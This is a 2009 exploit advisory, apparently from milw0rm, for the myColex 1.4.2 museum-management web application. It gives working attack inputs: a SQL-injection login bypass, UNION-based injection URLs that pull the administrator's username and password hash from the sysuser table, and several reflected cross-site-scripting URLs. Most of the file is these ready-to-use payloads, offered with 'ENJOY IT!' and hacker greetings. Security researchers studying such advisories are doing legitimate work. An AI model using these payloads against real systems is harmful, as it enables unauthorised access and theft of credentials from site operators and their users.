@@ -1,0 +1,182 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	        MULTIPLE REMOTE VULNERABILITIES	  	          	     |
+|--------------------------------------------------------------------------------------------|
+|                         	|        my-colex 1.4.2        |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://www.collector.ch/drupal5/index.php    		     			     |
+|-->DOWNLOAD: http://www.collector.ch/drupal5/?q=node/11          	                     |
+|-->DEMO: http://www.collector.ch/drupal5/?q=node/10					     |
+|-->CATEGORY: Management								     |
+|-->DESCRIPTION: myColex is a complete museum management and collection documentation        |
+|		system with longterm archiving capabilities based on Apache/PHP and mySQL... |
+|-->RELEASED: 2009-03-24								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: N/A									             |
+|-->CATEGORY: AUTH BYPASS/ SQL INJECTION / XSS					             |
+|-->AFFECT VERSION: 1.4.2 (maybe <= ?)				 		     	     |
+|-->Discovered Bug date: 2009-05-06							     |
+|-->Reported Bug date: 2009-05-06							     |
+|-->Fixed bug date: 2009-05-07								     |
+|-->Info patch: http://www.collector.ch/drupal5/?q=forum/15			             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#################
+/////////////////
+
+INTRODUCTION:
+
+/////////////////
+#################
+
+
+This app is completely vulnerable to sql code injection.
+
+Except auth bypass we can not exploit sql injection without a register user.
+
+
+#########################
+////////////////////////
+
+AUTH BYPASS (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>
+
+
+----------
+EXPLOIT:
+----------
+
+Name=' or 1=1#
+
+password=123456 (over six characters)
+
+Then, going to http://[HOST]/[HOME_PATH]/modules/admuser.php?Modus=Find
+
+We got admin credentials...
+
+Password is encrypted with MySQLSHA-1.
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: Be a register user +++++++++++++++++--------->>>>
+
+<<<<---------++++++++++++++ Condition: magic quotes = ON/OFF +++++++++++++++++--------->>>>
+
+
+------------------
+PROOF OF CONCEPT:
+------------------
+
+
+Some examples:
+
+http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&ID=1+and+0+union+all+select+1,version(),database(),user(),version()%23
+
+http://[HOST]/[HOME_PATH]/modules/medium.php?Modus=Detail&ID=23+and+0+UNION+ALL+SELECT+1,version(),database(),version(),user(),database(),7/*
+
+http://[HOST]/[HOME_PATH]/modules/person.php?Modus=Detail&ID=2+AND+0+UNION+ALL+SELECT+1,2,3,4,version(),6,user(),version(),database(),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36/*
+
+http://[HOST]/[HOME_PATH]/modules/schlagwort.php?Modus=Detail&ID=1+AND+0+UNION+ALL+SELECT+1,version(),database(),current_user(),user(),6/*
+
+There are more...
+
+Return: user, version, ...
+
+
+----------
+EXPLOITS:
+----------
+
+
+http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&ID=1+and+0+union+all+select+1,SuUser,SuEmail,SuPwd,SuSysAut+FROM+sysuser+WHERE+SuID=1%23
+
+http://[HOST]/[HOME_PATH]/modules/medium.php?Modus=Detail&ID=23+and+0+UNION+ALL+SELECT+1,2,3,4,SuUser,SuPwd,6+FROM+sysuser+WHERE+SuID=1/*
+
+Return: username/password (id=1)
+
+
+###########################
+///////////////////////////
+
+CROSS SITE SCRIPTING (XSS):
+
+///////////////////////////
+###########################
+
+
+XSS is possible where you like :P
+
+Some examples:
+
+
+http://[HOST]/[HOME_PATH]/modules/kalender.php?month=5&year=2009"><script>alert('y3nh4ck3r+was+here!')</script>
+
+http://[HOST]/[HOME_PATH]/modules/ereignis.php?Modus=List&Page=1"><script>alert('y3nh4ck3r+was+here!')</script>&Order=ErAnfangsdatum
+
+http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Search&Kontext=objekt"><script>alert('y3nh4ck3r+was+here!')</script>
+
+http://[HOST]/[HOME_PATH]/modules/image.php?image=<script>alert('y3nh4ck3r+was+here!')</script>
+
+
+Of course there are more...
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-15]
